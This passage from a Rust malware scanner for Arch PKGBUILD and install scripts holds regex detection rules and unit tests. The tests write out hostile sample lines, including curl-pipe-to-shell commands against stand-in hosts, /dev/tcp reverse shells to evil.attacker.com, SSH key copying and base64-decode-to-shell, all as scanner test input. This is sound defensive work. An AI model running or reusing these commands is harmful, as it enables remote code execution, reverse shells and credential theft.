                Pattern::Regex { pattern: r"\bpasswd\s+-d\b".to_string() },
                Pattern::Regex { pattern: r"\|\s*passwd\s".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This changes account credentials.".to_string(),
            cwe_id: Some("CWE-269".to_string()),
            enabled: true,
        },
        Rule {
            id: "TAMPER-001".to_string(),
            name: "Auth database write".to_string(),
            description: "Writes directly to /etc/passwd, /etc/shadow, /etc/group or /etc/gshadow — a direct backdoor-account injection.".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![Pattern::Regex { pattern: r"(>>?|tee\s+-?a?)\s*\S*/etc/(passwd|shadow|group|gshadow)\b".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This edits the live auth database.".to_string(),
            cwe_id: Some("CWE-269".to_string()),
            enabled: true,
        },
        Rule {
            id: "TAMPER-002".to_string(),
            name: "doas/sudoers nopasswd grant".to_string(),
            description: "Grants passwordless privilege via /etc/doas.conf or a NOPASSWD sudoers rule.".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![
                Pattern::Regex { pattern: r"/etc/doas\.conf".to_string() },
                Pattern::Regex { pattern: r"permit\s+(nopass|persist)".to_string() },
                Pattern::Regex { pattern: r"NOPASSWD".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This grants passwordless root.".to_string(),
            cwe_id: Some("CWE-269".to_string()),
            enabled: true,
        },
        Rule {
            id: "TAMPER-005".to_string(),
            name: "PAM tampering".to_string(),
            description: "Inserts a permissive PAM module (pam_permit.so) or writes into /etc/pam.d — an authentication bypass.".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![
                Pattern::Regex { pattern: r"pam_permit\.so".to_string() },
                Pattern::Regex { pattern: r"(>>?|tee).*?/etc/pam\.d/".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This tampers with authentication.".to_string(),
            cwe_id: Some("CWE-287".to_string()),
            enabled: true,
        },
        Rule {
            id: "TAMPER-011".to_string(),
            name: "pacman signature downgrade".to_string(),
            description: "Sets SigLevel = Never in /etc/pacman.conf, disabling package signature verification so future malicious updates are accepted silently.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"SigLevel\s*=\s*Never".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This disables pacman signature checking.".to_string(),
            cwe_id: Some("CWE-347".to_string()),
            enabled: true,
        },
        Rule {
            id: "TAMPER-013".to_string(),
            name: "Security control disabled".to_string(),
            description: "Disables a firewall, SELinux/AppArmor, or stops a security/audit service.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"\b(setenforce\s+0|ufw\s+disable|aa-disable)\b".to_string() },
                Pattern::Regex { pattern: r"systemctl\s+(stop|disable|mask)\s+(auditd|apparmor|firewalld|nftables|ufw)".to_string() },
                Pattern::Regex { pattern: r"\b(iptables|ip6tables|nft)\b.*(\s-F\b|flush\s+ruleset)".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This weakens host security controls.".to_string(),
            cwe_id: Some("CWE-693".to_string()),
            enabled: true,
        },
        Rule {
            id: "TAMPER-017".to_string(),
            name: "CA trust anchor injection".to_string(),
            description: "Installs a CA certificate into the system trust store — enables MITM of TLS for the whole system.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"trust\s+anchor\b".to_string() },
                Pattern::Regex { pattern: r"/etc/ca-certificates/trust-source/anchors".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify the certificate; a rogue trust anchor enables TLS MITM.".to_string(),
            cwe_id: Some("CWE-295".to_string()),
            enabled: true,
        },

        // --- supply-chain trust manipulation ---
        Rule {
            id: "TRUST-001".to_string(),
            name: "pacman keyring poisoning".to_string(),
            description: "Imports and locally-signs an arbitrary key into pacman's trust store (pacman-key --recv-keys/--lsign) so attacker-signed packages are accepted.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"pacman-key\s+.*(--recv-keys|--lsign|--lsign-key|\s-r\b)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. Packages ship keys via keyring packages, not by importing at build time.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
        },
        Rule {
            id: "TRUST-002".to_string(),
            name: "GPG key import at build time".to_string(),
            description: "Imports or fetches a GPG key during build/install (gpg --import/--recv-keys/--keyserver).".to_string(),
            severity: Severity::Medium,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"gpg\s+.*(--import|--recv-keys|--keyserver)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify the key; importing a key to satisfy validpgpkeys from an untrusted source defeats the check.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
        },
        Rule {
            id: "DEP-003".to_string(),
            name: "Package index/registry override".to_string(),
            description: "Redirects a language package manager to a non-default index/registry (pip --index-url, npm registry, GOPROXY, etc.) — a dependency-confusion vector.".to_string(),
            severity: Severity::High,
            category: Category::Dependencies,
            patterns: vec![Pattern::Regex { pattern: r"(--index-url|--extra-index-url|PIP_INDEX_URL=|npm_config_registry=|--registry\s+https?|GOPROXY=|--default-registry)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify the index host; overriding the registry redirects dependencies to an attacker source.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
        },
        Rule {
            id: "SRC-009".to_string(),
            name: "Obfuscated IP in URL".to_string(),
            description: "A source/download URL using an IPv6, hex, octal, or decimal IP literal to evade plain-IPv4 detection.".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex { pattern: r"://\[[0-9a-fA-F:]+\]".to_string() },
                // hex / decimal IP literal as the WHOLE host (terminated by :, /, or
                // end) — not a dotted hostname like 0x0.st.
                Pattern::Regex { pattern: r"://0x[0-9a-fA-F]+(?:[:/]|$)".to_string() },
                Pattern::Regex { pattern: r"://\d{8,10}(?:[:/]|$)".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Resolve and review the host; obfuscated IPs hide the real destination.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },

        // --- additional obfuscation / encoding ---
        Rule {
            id: "OBF-007".to_string(),
            name: "printf character assembly".to_string(),
            description: "A command assembled from printf hex/octal escapes (printf '\\x63\\x64' = 'cd') to hide it from literal matching.".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![Pattern::Regex { pattern: r#"printf\s+["']?(\\x[0-9a-fA-F]{2}|\\0?[0-7]{2,3}){2,}"#.to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decode the printf escapes and review the assembled command.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "OBF-008".to_string(),
            name: "Alternate-encoding decode".to_string(),
            description: "Decoding base32/base16 (an alternative to base64) to reconstruct a hidden payload.".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![Pattern::Regex { pattern: r"\b(base32|base16)\s+(-d|--decode|-[a-zA-Z]*d)\b".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decode and review the content.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "OBF-011".to_string(),
            name: "Interpreter here-string execution".to_string(),
            description: "Feeding an assembled string to a shell via a here-string (sh <<< ...) — a common way to run a string that was built to dodge matching.".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![Pattern::Regex { pattern: format!(r"{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s*<<<") }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review the here-string; this executes an assembled command.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },

        // --- additional remote-exec forms ---
        Rule {
            id: "EXEC-002".to_string(),
            name: "Shell -c command substitution fetch".to_string(),
            description: "sh -c \"$(curl ...)\" — fetches and runs remote code without an explicit pipe, evading the curl|sh rules.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: format!(r#"{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#) }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This runs code fetched from a URL.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
        },
        Rule {
            id: "EXEC-005".to_string(),
            name: "Detached background execution".to_string(),
            description: "Launches a fetched/dropped payload detached from the build (setsid/nohup), so it keeps running after install.".to_string(),
            severity: Severity::Medium,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"\b(setsid|nohup)\b.*(curl|wget|/tmp/|\bbash\b|\bsh\b|\s\./)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review the detached process; this outlives the install.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_builtin_rules() {
        let engine = RuleEngine::default();
        assert!(engine.rule_count() > 0);
    }

    #[test]
    fn test_all_builtin_rules_compile() {
        // Regression guard: every built-in rule must compile and load. A bad
        // pattern previously aborted the whole load via `?`, silently disabling
        // every rule defined after it. Assert the full set is present.
        //
        // Use a built-ins-ONLY engine here, not RuleEngine::default(): default()
        // also loads community rule files from user_rule_dirs(), so any machine
        // with a community rule installed (e.g. the shipped example.toml in
        // /usr/share/aur-scanner/rules.d/) would otherwise inflate the count and
        // fail this test for the wrong reason.
        let expected = get_builtin_rules();
        let mut engine = RuleEngine::new();
        engine
            .add_builtin_rules()
            .expect("built-in rules must all load");
        for rule in &expected {
            assert!(
                engine.get_rule(&rule.id).is_some(),
                "built-in rule {} failed to load (bad regex?)",
                rule.id
            );
        }
        assert_eq!(engine.rule_count(), expected.len());
    }

    #[test]
    fn test_match_curl_bash() {
        let engine = RuleEngine::default();
        let content = "curl https://malicious.com/script.sh | bash";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].rule_id, "DLE-001");
    }

    #[test]
    fn printed_message_mentioning_dotfile_is_not_flagged() {
        // Real false positive from google-chrome / vscode: a printed note that
        // mentions ~/.config must NOT trip HIDDEN-001 (it mentions a path; it
        // does not create one).
        let engine = RuleEngine::default();
        let m = engine.match_content(
            "note \"Custom flags should be put directly in: ~/.config/chrome-flags.conf\"",
            FileType::InstallScript,
        );
        assert!(
            !m.iter().any(|x| x.rule_id == "HIDDEN-001"),
            "a printed note mentioning ~/.config must not trip HIDDEN-001: {m:?}"
        );
    }

    #[test]
    fn actual_write_to_home_dotfile_is_still_flagged() {
        // The fix must not blind us to a real write: a redirect into ~/.bashrc
        // is an action, not a message, and must still trip HIDDEN-001.
        let engine = RuleEngine::default();
        let m = engine.match_content(
            "echo 'evil' >> ~/.bashrc",
            FileType::InstallScript,
        );
        assert!(
            m.iter().any(|x| x.rule_id == "HIDDEN-001"),
            "a real write to ~/.bashrc must still trip HIDDEN-001: {m:?}"
        );
    }

    #[test]
    fn line_continuation_does_not_evade_curl_bash() {
        // CR-3: the pipe-to-shell is on a backslash-continuation line. The old
        // per-physical-line matcher missed this; logical-line splicing catches it
        // and reports the originating (first) physical line.
        let engine = RuleEngine::default();
        let content = "build() {\n  curl https://evil/x.sh \\\n    | bash\n}";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(
            matches.iter().any(|m| m.rule_id == "DLE-001"),
            "continuation-split curl|bash must still trip DLE-001: {matches:?}"
        );
        assert!(matches.iter().any(|m| m.line == 2), "should report physical line 2");
    }

    #[test]
    fn heredoc_fed_to_interpreter_is_scanned() {
        // CR-4: a heredoc fed to `bash` executes its body, so a reverse shell in
        // it must be detected (it is NOT a printed message).
        let engine = RuleEngine::default();
        let content = "post_install() {\n  bash <<EOF\n  bash -i >& /dev/tcp/evil.com/4444 0>&1\nEOF\n}";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(
            matches.iter().any(|m| m.rule_id == "SHELL-001"),
            "reverse shell inside `bash <<EOF` must be caught: {matches:?}"
        );
    }

    #[test]
    fn reverse_shell_matches_hostname_and_ipv6() {
        // SHELL-001 broadened beyond dotted-quad IPv4.
        let engine = RuleEngine::default();
        for payload in [
            "bash -i >& /dev/tcp/evil.attacker.com/4444 0>&1",
            "exec 3<>/dev/tcp/0x7f000001/4444",
            "cat < /dev/tcp/dead:beef::1/9001",
        ] {
            let matches = engine.match_content(payload, FileType::Pkgbuild);
            assert!(
                matches.iter().any(|m| m.rule_id == "SHELL-001"),
                "should detect reverse shell in {payload:?}: {matches:?}"
            );
        }
    }

    #[test]
    fn case_variation_does_not_evade() {
        // Rules now compile case-insensitively by default.
        let engine = RuleEngine::default();
        let matches = engine.match_content("CURL https://evil/x | BASH", FileType::Pkgbuild);
        assert!(!matches.is_empty(), "uppercase curl|bash should still match");
    }

    #[test]
    fn bare_monero_address_detected_without_keyword() {
        // HI-6c: a miner config dropping a bare 95-char Monero address with no
        // `wallet`/`xmr` keyword nearby must still trip CRYPTO-003.
        let engine = RuleEngine::default();
        let addr = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
        let matches = engine.match_content(addr, FileType::Pkgbuild);
        assert!(
            matches.iter().any(|m| m.rule_id == "CRYPTO-003"),
            "bare Monero address should trip CRYPTO-003: {matches:?}"
        );
    }

    #[test]
    fn test_match_base64() {
        let engine = RuleEngine::default();
        let content = "echo 'payload' | base64 -d | sh";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(matches.iter().any(|m| m.rule_id == "OBF-001"));
    }

    #[test]
    fn test_no_false_positive() {
        let engine = RuleEngine::default();
        let content = "make && make install";
        let matches = engine.match_content(content, FileType::Pkgbuild);
        assert!(matches.is_empty());
    }

    #[test]
    fn test_install004_language_pkg_managers_in_install_hook() {
        let engine = RuleEngine::default();
        for s in [
            "pip install requests",
            "pip3 install --user evil",
            "poetry add malware",
            "uv pip install x",
            "pdm add y",
            "cargo install backdoor",
            "go install evil.example/x@latest",
            "gem install z",
            "deno run https://evil/x.ts",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(m.iter().any(|x| x.rule_id == "INSTALL-004"), "missed: {s}");
        }
    }

    #[test]
    fn test_install004_not_in_pkgbuild_build() {
        // Building a node/python project in build() legitimately runs these;
        // INSTALL-004 is scoped to install hooks only.
        let engine = RuleEngine::default();
        let m = engine.match_content("pip install .", FileType::Pkgbuild);
        assert!(!m.iter().any(|x| x.rule_id == "INSTALL-004"));
    }

    #[test]
    fn test_heredoc_message_not_flagged() {
        // A post_install message printed via `cat <<EOF` mentions ~/.zshrc but
        // does not modify it; ENV-003/HIDDEN-001 must not fire.
        let engine = RuleEngine::default();
        let content = "post_install() {\n    cat << EOF\nAdd this to ~/.zshrc:\n    source /usr/share/x.zsh\nEOF\n}";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(
            !matches.iter().any(|m| m.rule_id == "ENV-003" || m.rule_id == "HIDDEN-001"),
            "heredoc message should not trigger path rules: {matches:?}"
        );
    }

    #[test]
    fn test_redirected_heredoc_still_scanned() {
        // Writing into ~/.zshrc via a redirected heredoc IS a real modification.
        let engine = RuleEngine::default();
        let content = "cat <<EOF >> ~/.zshrc\nsource /tmp/evil\nEOF";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(matches.iter().any(|m| m.rule_id == "ENV-003"));
    }

    #[test]
    fn test_match_atomic_malicious_package() {
        let engine = RuleEngine::default();
        // Wave 1 (npm) and wave 2 (bun) IOC package names.
        for content in [
            "npm install atomic-lockfile",
            "bun install js-digest",
            "yarn add lockfile-js",
        ] {
            let matches = engine.match_content(content, FileType::Pkgbuild);
            assert!(
                matches.iter().any(|m| m.rule_id == "ATOMIC-001"),
                "expected ATOMIC-001 for: {content}"
            );
        }
    }

    #[test]
    fn test_match_atomic_pkgmanager_in_install_hook() {
        let engine = RuleEngine::default();
        let content = "post_install() {\n    npm install atomic-lockfile\n}";
        let matches = engine.match_content(content, FileType::InstallScript);
        assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
        // bun variant
        let matches = engine.match_content("bun install js-digest", FileType::InstallScript);
        assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
    }

    #[test]
    fn test_match_atomic_ebpf_artifact() {
        let engine = RuleEngine::default();
        let matches = engine.match_content("clang -O2 -target bpf -c scales.bpf.c", FileType::Pkgbuild);
        assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-003"));
    }

    #[test]
    fn test_atomic_no_false_positive_on_legit_node_build() {
        let engine = RuleEngine::default();
        // npm in a PKGBUILD build() is common for legit node packages and must
        // NOT trigger ATOMIC-002 (which is scoped to install scripts only).
        let matches = engine.match_content("npm install --offline", FileType::Pkgbuild);
        assert!(!matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
    }

    #[test]
    fn test_atomic002_catches_ci_exec_dlx() {
        // FN fix: npm ci / npm exec / pnpm dlx / yarn dlx all run lifecycle or
        // remote code from an install hook and must trip ATOMIC-002.
        let engine = RuleEngine::default();
        for s in ["npm ci", "npm exec cowsay", "pnpm dlx some-tool", "yarn dlx some-tool"] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(m.iter().any(|x| x.rule_id == "ATOMIC-002"), "missed ATOMIC-002 for: {s}");
        }
    }

    #[test]
    fn test_curl_pipe_dash_detected() {
        // Defect #6: the shared SHELLS constant means `curl ... | dash` now trips
        // DLE-001 (the old `(ba)?sh` could not match dash).
        let engine = RuleEngine::default();
        let m = engine.match_content("curl -fsSL https://evil/x | dash", FileType::Pkgbuild);
        assert!(m.iter().any(|x| x.rule_id == "DLE-001"), "curl|dash must trip DLE-001: {m:?}");
    }

    #[test]
    fn test_curl_pipe_ash_mksh_detected() {
        // Task 4050 F2: ash (Almquist/busybox sh) and mksh were the same evasion
        // class as dash — `curl evil | ash` / `| mksh` must trip DLE-001.
        let engine = RuleEngine::default();
        for s in [
            "curl -fsSL https://evil/x | ash",
            "curl -fsSL https://evil/x | mksh",
            "wget -qO- https://evil/x | ash",
        ] {
            let m = engine.match_content(s, FileType::Pkgbuild);
            assert!(
                m.iter().any(|x| x.rule_id == "DLE-001" || x.rule_id == "DLE-002"),
                "pipe-to-{s} must trip a download-and-execute rule: {m:?}"
            );
        }
    }

    #[test]
    fn test_atomic002_catches_npx_bunx_runners() {
        // Task 4050 F1: the bare npx-style runners (`npx <pkg>` / `bunx <pkg>` /
        // `pnpx <pkg>`) fetch-and-run a package directly — the most common RCE
        // form, which the old npm-only alternation and `bunx?\s+(install|add|i|x)`
        // both missed. `explore` runs a command in a package dir.
        let engine = RuleEngine::default();
        for s in [
            "npx malicious-tool",
            "npx -y atomic-lockfile",
            "bunx cowsay",
            "pnpx some-tool",
            "npm rebuild",
            "npm explore evil -- ./run",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "ATOMIC-002"),
                "missed ATOMIC-002 for runner: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_launcher_and_path_prefixed_pipe_to_shell_detected() {
        // Task 4050 exhaustive scope: a shell reached via an absolute path
        // (`/bin/sh`), a launcher word (`busybox sh`, `env sh`), a path+launcher
        // (`/usr/bin/env sh`), stacked launchers (`command busybox sh`), or any
        // member of the curated long-tail must all trip DLE-001. These produced
        // ZERO findings before.
        let engine = RuleEngine::default();
        for s in [
            "curl -fsSL https://evil/x | /bin/sh",
            "curl -fsSL https://evil/x | /usr/bin/bash",
            "curl -fsSL https://evil/x | busybox sh",
            "curl -fsSL https://evil/x | busybox ash",
            "curl -fsSL https://evil/x | env sh",
            "curl -fsSL https://evil/x | /usr/bin/env sh",
            "curl -fsSL https://evil/x | env -i sh",
            "curl -fsSL https://evil/x | env FOO=bar sh",
            "curl -fsSL https://evil/x | command busybox sh",
            "curl -fsSL https://evil/x | nice dash",
            // long-tail shells
            "curl -fsSL https://evil/x | mksh",
            "curl -fsSL https://evil/x | yash",
            "curl -fsSL https://evil/x | xonsh",
            "curl -fsSL https://evil/x | nu",
            "curl -fsSL https://evil/x | oil",
        ] {
            let m = engine.match_content(s, FileType::Pkgbuild);
            assert!(
                m.iter().any(|x| x.rule_id == "DLE-001"),
                "launcher/path/long-tail pipe-to-shell must trip DLE-001: {s} -> {m:?}"
            );
        }
        // wget variant -> DLE-002
        let m = engine.match_content("wget -qO- https://evil/x | /bin/sh", FileType::Pkgbuild);
        assert!(m.iter().any(|x| x.rule_id == "DLE-002"), "wget|/bin/sh must trip DLE-002: {m:?}");
    }

    #[test]
    fn test_shell_sink_no_false_positive() {
        // The launcher/path generalization must not flag a pipe whose target is
        // NOT a shell, even when a launcher word or path is present.
        let engine = RuleEngine::default();
        for s in [
            "curl -fsSL https://x | /usr/bin/tee out.txt",
            "curl -fsSL https://x | env grep foo",
            "curl -fsSL https://x | nice make",
            "curl -fsSL https://x | command ls",
            "curl -fsSL https://x | /bin/number",
            "curl -fsSL https://x | busybox cat",
            "curl -fsSL https://x | awkward-tool",
        ] {
            let m = engine.match_content(s, FileType::Pkgbuild);
            assert!(
                !m.iter().any(|x| x.rule_id == "DLE-001"),
                "non-shell pipe target must not trip DLE-001: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_atomic002_bun_runner_not_double_reported() {
        // The `bun` subcommand pattern and the `bunx` runner pattern must not
        // both match the same line (they cover disjoint commands).
        let engine = RuleEngine::default();
        let m = engine.match_content("bunx evil-pkg", FileType::InstallScript);
        let n = m.iter().filter(|x| x.rule_id == "ATOMIC-002").count();
        assert_eq!(n, 1, "bunx runner should report ATOMIC-002 exactly once: {m:?}");
    }

    #[test]
    fn test_hidden002_no_fp_on_tmpdir_and_mktemp() {
        // Defect #10: a /tmp path as an assignment value or a plain argument is
        // not execution and must not trip HIDDEN-002.
        let engine = RuleEngine::default();
        for s in [
            "TMPDIR=/tmp/mybuild",
            "export TMPDIR=/tmp/mybuild",
            "builddir=$(mktemp -d /tmp/pkg.XXXXXX)",
            "cp foo /tmp/bar",
            "cat ~/.ssh/id_rsa > /tmp/stolen",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                !m.iter().any(|x| x.rule_id == "HIDDEN-002"),
                "HIDDEN-002 false positive on: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_hidden002_still_catches_tmp_execution() {
        // Real execution from /tmp (command position or via an interpreter) must
        // still fire.
        let engine = RuleEngine::default();
        for s in [
            "/tmp/payload.sh",
            "bash /tmp/payload",
            "make && /tmp/dropper",
            "chmod +x /tmp/x",
        ] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "HIDDEN-002"),
                "HIDDEN-002 missed real /tmp execution: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_install002_no_fp_on_configure() {
        // Defect #10: `./configure` (and `cd ./build`) are not dropped-payload
        // executions and must not trip INSTALL-002.
        let engine = RuleEngine::default();
        for s in ["./configure", "./configure --prefix=/usr", "cd ./build"] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                !m.iter().any(|x| x.rule_id == "INSTALL-002"),
                "INSTALL-002 false positive on: {s} -> {m:?}"
            );
        }
    }

    #[test]
    fn test_install002_still_catches_dropped_script() {
        // A relative script/binary with a payload extension run in command
        // position still fires.
        let engine = RuleEngine::default();
        for s in ["./payload.sh", "./drop/x.bin"] {
            let m = engine.match_content(s, FileType::InstallScript);
            assert!(
                m.iter().any(|x| x.rule_id == "INSTALL-002"),
                "INSTALL-002 missed dropped script: {s} -> {m:?}"
            );
        }
    }
}
